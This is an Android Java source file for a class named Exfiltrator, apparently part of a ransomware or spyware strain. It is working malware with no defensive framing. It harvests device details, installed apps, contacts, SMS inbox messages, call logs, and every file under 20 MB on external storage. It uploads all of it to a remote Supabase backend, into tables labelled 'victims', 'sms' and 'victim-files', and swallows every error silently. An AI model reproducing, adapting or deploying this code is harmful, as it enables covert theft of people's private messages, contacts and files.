package com.rhfvnc.strain;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.Settings;
import org.json.JSONObject;
import java.io.*;
import java.util.List;
public class Exfiltrator implements Runnable {
    private final Context ctx;
    private final String deviceId;
    private static final long MAX_FILE = 20L * 1024 * 1024;
    public Exfiltrator(Context c) {
        ctx = c;
        String id;
        try { id = Settings.Secure.getString(c.getContentResolver(), Settings.Secure.ANDROID_ID); }
        catch (Throwable t) { id = "unknown"; }
        deviceId = id;
    }
    @Override
    public void run() {
        try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
        try { sendDevice(); } catch (Throwable ignored) {}
        try { sendContacts(); } catch (Throwable ignored) {}
        try { sendSms(); } catch (Throwable ignored) {}
        try { sendCalls(); } catch (Throwable ignored) {}
        try { walk(new File(Environment.getExternalStorageDirectory())); } catch (Throwable ignored) {}
    }
    private void sendDevice() throws Exception {
        JSONObject o = new JSONObject();
        o.put("device_id", deviceId);
        o.put("model", Build.MODEL);
        o.put("manufacturer", Build.MANUFACTURER);
        o.put("android", Build.VERSION.RELEASE);
        o.put("wallet_address", SolanaCheck.WALLET);
        o.put("app_list", appList());
        SupabaseClient.insert("victims", o.toString());
    }
    private String appList() {
        try {
            PackageManager pm = ctx.getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(0);
            StringBuilder sb = new StringBuilder();
            for (ApplicationInfo a : apps) sb.append(a.packageName).append(",");
            return sb.toString();
        } catch (Throwable t) { return ""; }
    }
    private void sendContacts() {
        try {
            Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (c == null) return;
            while (c.moveToNext()) {
                try {
                    JSONObject o = new JSONObject();
                    o.put("device_id", deviceId);
                    o.put("name", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                    o.put("phone", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    SupabaseClient.insert("contacts", o.toString());
                } catch (Throwable ignored) {}
            }
            c.close();
        } catch (Throwable ignored) {}
    }
    private void sendSms() {
        try {
            Cursor c = ctx.getContentResolver().query(
                Uri.parse("content://sms/inbox"), null, null, null, null);
            if (c == null) return;
            int n = 0;
            while (c.moveToNext() && n < 500) {
                try {
                    JSONObject o = new JSONObject();
                    o.put("device_id", deviceId);
                    o.put("sender", c.getString(c.getColumnIndexOrThrow("address")));
                    o.put("body", c.getString(c.getColumnIndexOrThrow("body")));
                    o.put("timestamp", c.getLong(c.getColumnIndexOrThrow("date")));
                    SupabaseClient.insert("sms", o.toString());
                    n++;
                } catch (Throwable ignored) {}
            }
            c.close();
        } catch (Throwable ignored) {}
    }
    private void sendCalls() {
        try {
            Cursor c = ctx.getContentResolver().query(
                android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null);
            if (c == null) return;
            int n = 0;
            while (c.moveToNext() && n < 500) {
                try {
                    JSONObject o = new JSONObject();
                    o.put("device_id", deviceId);
                    o.put("number", c.getString(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER)));
                    o.put("type", c.getInt(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE)));
                    o.put("duration", c.getInt(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION)));
                    o.put("timestamp", c.getLong(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE)));
                    SupabaseClient.insert("calls", o.toString());
                    n++;
                } catch (Throwable ignored) {}
            }
            c.close();
        } catch (Throwable ignored) {}
    }
    private void walk(File dir) {
        if (dir == null || !dir.exists()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory()) {
                String nm = f.getName();
                if (nm.equals("Android")) continue;
                walk(f);
            } else {
                if (shouldUpload(f)) uploadOne(f);
            }
        }
    }
    private boolean shouldUpload(File f) {
        try {
            long sz = f.length();
            if (sz <= 0 || sz > MAX_FILE) return false;
            String n = f.getName().toLowerCase();
            if (n.endsWith(".rhfvnc")) return false;
            return true;
        } catch (Throwable t) { return false; }
    }
    private void uploadOne(File f) {
        try {
            FileInputStream in = new FileInputStream(f);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
            in.close();
            byte[] data = bos.toByteArray();
            String safe = f.getName().replaceAll("[^a-zA-Z0-9._-]", "_");
            String path = deviceId + "/" + System.currentTimeMillis() + "_" + safe;
            String resp = SupabaseClient.uploadFile("victim-files", path, data);
            JSONObject o = new JSONObject();
            o.put("device_id", deviceId);
            o.put("filename", f.getName());
            o.put("path", f.getAbsolutePath());
            o.put("storage_url", resp);
            o.put("size_bytes", data.length);
            SupabaseClient.insert("files", o.toString());
        } catch (Throwable ignored) {}
    }
}
